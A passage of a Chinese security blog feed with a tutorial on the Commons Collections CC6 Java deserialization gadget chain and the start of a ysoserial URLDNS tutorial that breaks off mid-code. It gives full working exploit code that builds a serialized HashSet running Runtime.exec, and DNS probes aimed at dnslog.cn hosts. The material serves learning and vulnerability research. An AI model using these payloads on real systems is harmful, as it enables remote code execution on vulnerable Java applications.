LazyMap.decorate(innerMap,transformerChain);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 上面还是使用CC1构造的，不变， 这里创建 TiedMapEntry 测试一下</span></span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(outerMap,<span class="string">&quot;yhy&quot;</span>);</span><br><span class="line"><span class="comment">//        tiedMapEntry.hashCode();</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//        // HashMap 自动触发</span></span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">hashMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line"></span><br><span class="line">        hashMap.put(tiedMapEntry, <span class="string">&quot;yhy&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// put 后再把key去除，防止影响后续执行</span></span><br><span class="line">        outerMap.remove(<span class="string">&quot;yhy&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 反射加入加入payload ,这样在put时就不会执行</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">f</span> <span class="operator">=</span> ChainedTransformer.class.getDeclaredField(<span class="string">&quot;iTransformers&quot;</span>);</span><br><span class="line">        f.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        f.set(transformerChain, transformers);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 序列化</span></span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;out.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(hashMap);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 反序列化读取 out.bin 文件</span></span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;out.bin&quot;</span>));</span><br><span class="line">        ois.readObject();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>虽然简化后的也能达到效果，为了学习，补充知识点，我们还是再来看看省略掉的<code>java.util.HashSet.readObject()</code></p>
<h3 id="2-3-HashSet"><a href="#2-3-HashSet" class="headerlink" title="2.3 HashSet"></a>2.3 HashSet</h3><p>在<code>HashSet#readObject</code>中，将序列化数据反序列化后作为<strong>key</strong>调用<code>map.put</code>中，<img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210627215330.png" alt="image-20210627203446529"></p>
<p>这里的 map 实际上就是 HashMap ，之后的过程也和之前的一样，put –&gt; hash –&gt; hashCode<img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210627215355.png" alt="image-20210627203636614"></p>
<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210627215407.png" alt="image-20210627203705755"></p>
<p>下面就是将我们构造好的数据放入HashSet中，让其在反序列化是自动执行。这里(不只是这里，所有反序列化的地方)其实还要看一下HashSet中的序列化过程（writeObject）是否可控，这里我们只要能控制map的key，那么就能控制序列化数据 s<img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210627215413.png" alt="image-20210627204340028"></p>
<p>而 <strong>map</strong> ，我们可以在HashSet中看到并没有一个直接的方法可以直接赋值修改的，这就又要用到反射相关的知识了，</p>
<p>首先获取HashSet中map的值</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 指定初始容量为1</span></span><br><span class="line"><span class="type">HashSet</span> <span class="variable">hashSet</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashSet</span>(<span class="number">1</span>);</span><br><span class="line">hashSet.add(<span class="string">&quot;yhy&quot;</span>);</span><br><span class="line"><span class="comment">// 反射获取HashSet中map的值</span></span><br><span class="line"><span class="type">Field</span> <span class="variable">map</span> <span class="operator">=</span>  Class.forName(<span class="string">&quot;java.util.HashSet&quot;</span>).getDeclaredField(<span class="string">&quot;map&quot;</span>);</span><br><span class="line"><span class="comment">// 取消访问限制检查</span></span><br><span class="line">map.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="comment">// 获取HashSet中map的值</span></span><br><span class="line"><span class="type">HashMap</span> <span class="variable">hashSetMap</span> <span class="operator">=</span> (HashMap) map.get(hashSet);</span><br></pre></td></tr></table></figure>

<p>然后修改 hashSetMap 中的 key 值为 hashset</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 反射获取 HashMap 中 table 的值</span></span><br><span class="line"><span class="type">Field</span> <span class="variable">table</span> <span class="operator">=</span>  Class.forName(<span class="string">&quot;java.util.HashMap&quot;</span>).getDeclaredField(<span class="string">&quot;table&quot;</span>);</span><br><span class="line"><span class="comment">// 取消访问限制检查</span></span><br><span class="line">table.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="comment">// 获取 HashMap 中 table 的值</span></span><br><span class="line">Object[] hashMapTable = (Object[]) table.get(hashSetMap);</span><br><span class="line"></span><br><span class="line"><span class="type">Object</span> <span class="variable">node</span> <span class="operator">=</span> hashMapTable[<span class="number">0</span>];</span><br><span class="line"><span class="keyword">if</span>(node == <span class="literal">null</span>) &#123;</span><br><span class="line">    node = hashMapTable[<span class="number">1</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 将key 设为 tiedMapEntry</span></span><br><span class="line"><span class="type">Field</span> <span class="variable">key</span> <span class="operator">=</span>  node.getClass().getDeclaredField(<span class="string">&quot;key&quot;</span>);</span><br><span class="line">key.setAccessible(<span class="literal">true</span>);</span><br><span class="line">key.set(node, tiedMapEntry);</span><br></pre></td></tr></table></figure>

<p>在这里利用反射获取了 hashSetMap 中的 table 属性，table 其实就是hashmap的存储底层，将 &lt;Key,Value&gt; 封装在了 Node 对象中，在获取到了 table 中的 key 之后，利用反射修改其为tiedMapEntry<img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210627215440.png" alt="image-20210627212117518"></p>
<p>合并执行<img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210627215446.png" alt="image-20210627212943691"></p>
<p>完整代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.HashSet;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> yhy</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@date</span> 2021/6/27 20:47</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@github</span> https://github.com/yhy0</span></span><br><span class="line"><span class="comment"> * ysoserial </span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">	Gadget chain:</span></span><br><span class="line"><span class="comment">	    java.io.ObjectInputStream.readObject()</span></span><br><span class="line"><span class="comment">            java.util.HashSet.readObject()</span></span><br><span class="line"><span class="comment">                java.util.HashMap.put()</span></span><br><span class="line"><span class="comment">                java.util.HashMap.hash()</span></span><br><span class="line"><span class="comment">                    org.apache.commons.collections.keyvalue.TiedMapEntry.hashCode()</span></span><br><span class="line"><span class="comment">                    org.apache.commons.collections.keyvalue.TiedMapEntry.getValue()</span></span><br><span class="line"><span class="comment">                        org.apache.commons.collections.map.LazyMap.get()</span></span><br><span class="line"><span class="comment">                            org.apache.commons.collections.functors.ChainedTransformer.transform()</span></span><br><span class="line"><span class="comment">                            org.apache.commons.collections.functors.InvokerTransformer.transform()</span></span><br><span class="line"><span class="comment">                            java.lang.reflect.Method.invoke()</span></span><br><span class="line"><span class="comment">                                java.lang.Runtime.exec()</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    by @matthias_kaiser</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC6_Y</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">//此处构建了一个transformers的数组，在其中构建了任意函数执行的核心代码</span></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;/System/Applications/Calculator.app/Contents/MacOS/Calculator&quot;</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>), <span class="comment">// 隐藏错误信息</span></span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="comment">//将transformers数组存入 ChainedTransformer 这个继承类</span></span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="comment">//使用 LazyMap</span></span><br><span class="line">        <span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> LazyMap.decorate(innerMap,transformerChain);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 上面还是使用CC1构造的，不变， 这里创建 TiedMapEntry 测试一下</span></span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(outerMap,<span class="string">&quot;yhy&quot;</span>);</span><br><span class="line"><span class="comment">//        tiedMapEntry.hashCode();</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// HashSet</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 指定初始容量为1</span></span><br><span class="line">        <span class="type">HashSet</span> <span class="variable">hashSet</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashSet</span>(<span class="number">1</span>);</span><br><span class="line">        hashSet.add(<span class="string">&quot;yhy&quot;</span>);</span><br><span class="line">        <span class="comment">// 反射获取HashSet中map的值</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">map</span> <span class="operator">=</span>  Class.forName(<span class="string">&quot;java.util.HashSet&quot;</span>).getDeclaredField(<span class="string">&quot;map&quot;</span>);</span><br><span class="line">        <span class="comment">// 取消访问限制检查</span></span><br><span class="line">        map.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="comment">// 获取HashSet中map的值</span></span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">hashSetMap</span> <span class="operator">=</span> (HashMap) map.get(hashSet);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 反射获取 HashMap 中 table 的值</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">table</span> <span class="operator">=</span>  Class.forName(<span class="string">&quot;java.util.HashMap&quot;</span>).getDeclaredField(<span class="string">&quot;table&quot;</span>);</span><br><span class="line">        <span class="comment">// 取消访问限制检查</span></span><br><span class="line">        table.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="comment">// 获取 HashMap 中 table 的值</span></span><br><span class="line">        Object[] hashMapTable = (Object[]) table.get(hashSetMap);</span><br><span class="line"></span><br><span class="line">        <span class="type">Object</span> <span class="variable">node</span> <span class="operator">=</span> hashMapTable[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">if</span>(node == <span class="literal">null</span>) &#123;</span><br><span class="line">            node = hashMapTable[<span class="number">1</span>];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 将 key 设为 tiedMapEntry</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">key</span> <span class="operator">=</span>  node.getClass().getDeclaredField(<span class="string">&quot;key&quot;</span>);</span><br><span class="line">        key.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        key.set(node, tiedMapEntry);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 序列化</span></span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;outY.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(hashSet);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 反序列化读取 out.bin 文件</span></span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;outY.bin&quot;</span>));</span><br><span class="line">        ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="0x03-总结"><a href="#0x03-总结" class="headerlink" title="0x03 总结"></a>0x03 总结</h2><p>其实上周是打算写CC2链的，但是上周有个项目要做，就没心情去学、去总结，有两个原因：</p>
<ol>
<li>确实有点忙，有点累</li>
<li>CC2链要学习新知识，有点复杂，搞得没心情学，看不下去，搞得我有点懈怠了，想休息</li>
</ol>
<p>所以上周也就没更新，这周大概恢复好了，看文章时发现CC6比较好搞点，知识大都是学过的，串联起来就好了，这就有信心接着写了。</p>
<p>接下来的其他CC链，并不会按照顺序来，学到哪，就写到哪，下周应该会写CC5或者CC7,毕竟和这两篇有关联，学起来不会太吃力。</p>
<p>还是P牛说的不错，<strong>独立思考很重要。</strong></p>
<blockquote>
<p>  学习的过程是一个思考的过程，不是追求刷题，追求刷完了ysoserial的所有Gadget的代码。我觉得这样效率是不高的。通常来说刷题获得的记忆，在一段时间不接触后就会慢慢忘掉，但自然学习思考获得的结果，是不容易失去的。</p>
</blockquote>
<h2 id="0x04-参考"><a href="#0x04-参考" class="headerlink" title="0x04 参考"></a>0x04 参考</h2><p>天下大木头师傅的 <a href="https://www.yuque.com/tianxiadamutou/zcfd4v/ac9529#55fcdbc0">https://www.yuque.com/tianxiadamutou/zcfd4v/ac9529#55fcdbc0</a></p>
<p>P牛知识星球-java安全漫谈</p>
]]></content>
      <categories>
        <category>漏洞原理</category>
      </categories>
      <tags>
        <tag>漏洞原理</tag>
      </tags>
  </entry>
  <entry>
    <title>Java ysoserial学习之URLDNS(一)</title>
    <url>/2021/06/04/Java%20ysoserial%E5%AD%A6%E4%B9%A0%E4%B9%8BURLDNS(%E4%B8%80)/</url>
    <content><![CDATA[<blockquote>
<p>  雄关漫道真如铁 而今迈步从头越</p>
</blockquote>
<h2 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h2><p><strong>URLDNS</strong> 是 ysoserial 中利用链的一个 payload，该 payload 的目的只有一个，就是确定目标系统上是否存在可控的 <code>readObject()</code> 方法，即是否存在Java 反序列化漏洞。该利用链具有如下特点:</p>
<ul>
<li>不限制jdk版本，使用 Java 内置的 URL 类，不依赖于任何的第三方库</li>
<li>只对指定的 URL 发送 DNS 查询，不做其他操作</li>
<li>在⽬目标没有回显的时候，能够通过DNS请求得知是否存在反序列列化漏洞</li>
</ul>
<h2 id="0x02-原理"><a href="#0x02-原理" class="headerlink" title="0x02 原理"></a>0x02 原理</h2><p><code>java.util.HashMap</code> 实现了<code>Serializable</code> 接口，重写了 <code>readObject</code>, 在反序列化时会调用 <code>hash</code> 函数计算 key 的 hashCode.而 <code>java.net.URL</code> 的 <code>hashCode</code> 在计算时会调用 <code>getHostAddress</code> 来解析域名, 从而发出 DNS 请求。</p>
<p>我们从 <strong>ysoserial</strong> 项目<code>src/main/java/ysoserial/payloads/URLDNS.java</code> 的注释中可以看到 <strong>URLDNS</strong>的调用链（Gadget Chain):</p>
<blockquote>
<p>  Gadget Chain:<br>       HashMap.readObject()<br>         HashMap.putVal()<br>           HashMap.hash()<br>             URL.hashCode()</p>
</blockquote>
<h3 id="2-1-HashMap"><a href="#2-1-HashMap" class="headerlink" title="2.1 HashMap"></a>2.1 HashMap</h3><blockquote>
<p>HashMap: java中的一种容器，用来存储内容，内容以键值对的形式存放。</p>
</blockquote>
<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210604084353.png" alt="image-20210602184510047"></p>
<p>先来看看 HashMap 自己实现的 readObject() 函数</p>
<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210604084403.png" alt="image-20210602173545433"></p>
<p>这里通过一个 for 循环将 HashMap 中存储的key通过 <code>K key = (K) s.readObject();</code> <strong>反序列化后</strong>，调用 <strong>putVal</strong>和<strong>hash</strong>函数，也就是前面提到的Gadget Chain中的中间两个调用链，再来看看，<strong>hash</strong>这个函数的实现</p>
<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210604084411.png" alt="image-20210602173740650"></p>
<p>调用了参数 key 的 <strong>hashCode</strong> 函数，而我们从<code>src/main/java/ysoserial/payloads/URLDNS.java</code>中可以得知这个key就是一个URL对象。</p>
<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210604084416.png" alt="image-20210602175239536"></p>
<p>接下来再看看 java 的基本类 URL 中关于 <strong>HashCode</strong> 的实现</p>
<h3 id="2-2-hashCode"><a href="#2-2-hashCode" class="headerlink" title="2.2 hashCode"></a>2.2 hashCode</h3><p>我们来自己调用 URL 的 <code>hashCode</code> 函数来看看效果</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UrlDNSTest</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">URL</span> <span class="variable">url</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;http://wursz7.dnslog.cn&quot;</span>);</span><br><span class="line">        url.hashCode();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210604084423.png" alt="image-20210602174600694"></p>
<p>可以得知<code>hashCode</code>触发了一次DNS请求，使用 Ctrl+右键 点进去看看该函数的具体实现</p>
<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210604084428.png" alt="image-20210602172051929"></p>
<p>这里注意一下 <strong>handler</strong> 是一个 <strong>transient</strong>  关键字修饰的变量，不参与序列化。</p>
<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210604084438.png" alt="image-20210603225458176"></p>
<p>经过Debug跟踪发现会在 HashMap#readObject 的 <code>K key = (K) s.readObject();</code> 这行进入URL#readObject 的<code>getURLStreamHandler</code> 函数进行 handler 的赋值<img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210604084443.png" alt="image-20210604080533266"></p>
<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210604084449.png" alt="image-20210604080636339"></p>
<p>hashCode 的默认值为-1, 然后接下来进入 <code>hashCode = handler.hashCode(this);</code>, 可以看到调用了<code>getHostAddress</code>函数，这个函数就是用来 DNS 解析，返回对应 IP 的。</p>
<blockquote>
<p>  URL 类将在比较时，如果两个主机名都可以解析为相同的 IP 地址，则认为两个主机是等效的；</p>
</blockquote>
<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210604084433.png" alt="image-20210602172427092"></p>
<h3 id="2-3-put-触发"><a href="#2-3-put-触发" class="headerlink" title="2.3 put 触发"></a>2.3 put 触发</h3><p>ysoserial这里明确说了 put 函数来触发，通过使用 URL 对象来作为 key 就可以触发一次DNS请求。</p>
<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210604084455.png" alt="image-20210602175512074"></p>
<p>动手实验一下</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UrlDNSTest</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">URL</span> <span class="variable">url</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;http://r6gyvj.dnslog.cn&quot;</span>);</span><br><span class="line">        map.put(url, <span class="string">&quot;yhy&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210604084500.png" alt="image-20210602175733191"></p>
<p>而put为什么会触发，看下put函数的实现</p>
<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210604084505.png" alt="image-20210603080617979"></p>
<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210604084509.png" alt="image-20210603082700138"></p>
<p>也是调用了hash(key) –&gt; key.hashCode() 跟之前一样，所以会在put进一个key为URL对象时，会进行一次DNS解析。</p>
<h3 id="2-4-反序列化"><a href="#2-4-反序列化" class="headerlink" title="2.4 反序列化"></a>2.4 反序列化</h3><p>到了这里有什么用呢？迷了，明明是put时会进行一次DNS解析，看上去并没有和反序列化有什么关联。接下来该干嘛，网上其他文章直接结论了，而像我这种菜鸡，到这一步，完全没搞懂之后应该干啥，怎么把前面说的给串联起来。</p>
<p>在看鸿蒙发布会时，终于想明白了，现在我们知道当 HashMap 传入一个URL对象时，会进行一次DNS解析，并且HashMap 实现了<code>Serializable</code> 接口，重写了 <code>readObject</code>，也就是说当一个Java应用存在反序列化漏洞时，我们可以通过传入一个序列化后的HashMap数据(将URL对象作为key放入HashMap)，当我们传入的数据到达该Java应用的反序列化漏洞点时,这时程序就会调用 HashMap 重写的<strong>readObject</strong> 函数来反序列化读取数据，也就是上述分析过程，然后就会触发 key.hashCode() 函数，进行一次DNS解析。</p>
<h3 id="2-5-至善至美"><a href="#2-5-至善至美" class="headerlink" title="2.5 至善至美"></a>2.5 至善至美</h3><p>到上面已经可以作为漏洞探测了，但是 ysoserial 项目中有其他代码，我们可以看看具体是什么情况</p>
<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210604084516.png" alt="image-20210603214336126"></p>
<p>这里通过继承 <code>URLStreamHandler</code> 类，重写了<code>openConnection</code> 和 <code>getHostAddress</code> 函数，然后</p>
<p>将handler在创建URL时传入，其实这个传入的handler就是hashCode函数中的handler</p>
<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210604084530.png" alt="image-20210602172051929"></p>
<p>前面提到过，HashMap#put 时也会调用 <strong>getHostAddress</strong> 函数进行一次DNS解析，这里就是通过重写的 <strong>getHostAddress</strong> 函数覆盖掉原来的函数，不进行DNS解析，防止在payload创建期间进行DNS解析，也就是一个防干扰功能。</p>
<p>接下来看看 **Reflections.setFieldValue(u, “hashCode”, -1); <strong>这一行代码。Reflections</strong>类是 ysoserial 写的一个反射类<code>src/main/java/ysoserial/payloads/util/Reflections.java</code>，这是 <code>setFieldValue</code>函数</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(<span class="keyword">final</span> Object obj, <span class="keyword">final</span> String fieldName, <span class="keyword">final</span> Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">   <span class="keyword">final</span> <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> getField(obj.getClass(), fieldName);</span><br><span class="line">   field.set(obj, value);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">static</span> Field <span class="title function_">getField</span><span class="params">(<span class="keyword">final</span> Class&lt;?&gt; clazz, <span class="keyword">final</span> String fieldName)</span> &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">	<span class="keyword">try</span> &#123;</span><br><span class="line">	    field = clazz.getDeclaredField(fieldName);</span><br><span class="line">	    setAccessible(field);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (NoSuchFieldException ex) &#123;</span><br><span class="line">            <span class="keyword">if</span> (clazz.getSuperclass() != <span class="literal">null</span>)</span><br><span class="line">                field = getField(clazz.getSuperclass(), fieldName);</span><br><span class="line">        &#125;</span><br><span class="line">		<span class="keyword">return</span> field;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

<p>之前在前置知识 <a href="http://mp.weixin.qq.com/s?__biz=MzkzODIwMTIwNg==&mid=2247484123&idx=1&sn=598d098ffe19be59547c09538716e196&chksm=c2829bc2f5f512d4e77af3085132c9cf18d9b2fec5abc1c0f6a120561d52be43be29ff0b2a92&scene=21#wechat_redirect">初探Java反序列化漏洞(二)</a>中讲到过反射, 上述代码就是通过反射来设置 URL 类的 hashCode的值为-1，这是因为在 HashMap#put 时，已经调用过一次hashCode() 函数，这时 hashCode的值就会改变，不再为-1，让其进行下一步执行DNS解析。</p>
<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210604084535.png" alt="image-20210602211410050"></p>
<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210604084542.png" alt="image-20210602211523937"></p>
<p>那也就是说在下一步经过HashMap的<strong>readObject</strong>函数反序列化时, 因为此时 <code>hashCode != -1</code> ,会直接返回hashCode的值，不再进行调用 handler.hashCode(this) 。因此使用 <code>Reflections.setFieldValue(u, &quot;hashCode&quot;, -1); </code> 反射将 <strong>hashCode</strong>的值设为 <strong>-1</strong>。</p>
<p>之后通过<img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210604084549.png" alt="image-20210604082305067"> 执行序列化操作</p>
<h2 id="0x03-代码模拟"><a href="#0x03-代码模拟" class="headerlink" title="0x03 代码模拟"></a>0x03 代码模拟</h2><p>我们来手动复原一下</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> ysoserial;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.net.InetAddress;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.net.URLConnection;</span><br><span class="line"><span class="keyword">import</span> java.net.URLStreamHandler;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> yhy</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@date</span> 2021/6/2 16:21</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@github</span> https://github.com/yhy0</span></span><br><span class="line"><span class="comment"> 